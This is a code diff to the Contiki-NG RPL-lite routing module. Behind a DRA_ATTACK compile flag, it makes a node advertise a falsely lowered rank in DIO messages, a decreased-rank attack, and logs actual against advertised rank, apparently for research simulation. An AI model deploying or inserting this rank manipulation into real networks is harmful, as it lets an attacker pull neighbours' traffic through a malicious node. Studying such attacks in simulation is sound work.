@@ -1,0 +1,40 @@
+diff --git a/os/net/routing/rpl-lite/rpl-icmp6.c b/os/net/routing/rpl-lite/rpl-icmp6.c
+index 1601812..3c35ac1 100644
+--- a/os/net/routing/rpl-lite/rpl-icmp6.c
++++ b/os/net/routing/rpl-lite/rpl-icmp6.c
+@@ -51,6 +51,7 @@
+ 
+ #include <inttypes.h>
+ #include <limits.h>
++#include <stdio.h>
+ 
+ /* Log configuration */
+ #include "sys/log.h"
+@@ -380,8 +381,25 @@ rpl_icmp6_dio_output(uip_ipaddr_t *uc_addr)
+   buffer[pos++] = curr_instance.instance_id;
+   buffer[pos++] = curr_instance.dag.version;
+ 
+-  set16(buffer, pos,
+-        rpl_get_leaf_only() ? RPL_INFINITE_RANK : curr_instance.dag.rank);
++  rpl_rank_t advertised_rank =
++    rpl_get_leaf_only() ? RPL_INFINITE_RANK : curr_instance.dag.rank;
++#ifdef DRA_ATTACK
++#ifndef DRA_RANK_DECREMENT
++#define DRA_RANK_DECREMENT 512
++#endif
++  if(advertised_rank != RPL_INFINITE_RANK && advertised_rank > ROOT_RANK) {
++    advertised_rank = advertised_rank > ROOT_RANK + DRA_RANK_DECREMENT
++      ? advertised_rank - DRA_RANK_DECREMENT
++      : ROOT_RANK;
++    printf("DRA_ADVERTISE time_ticks=%lu actual_rank=%u advertised_rank=%u decrement=%u\n",
++           (unsigned long)clock_time(),
++           (unsigned)curr_instance.dag.rank,
++           (unsigned)advertised_rank,
++           (unsigned)DRA_RANK_DECREMENT);
++  }
++#endif
++
++  set16(buffer, pos, advertised_rank);
+   pos += 2;
+ 
+   buffer[pos] = curr_instance.dag.grounded ? RPL_DIO_GROUNDED : 0;
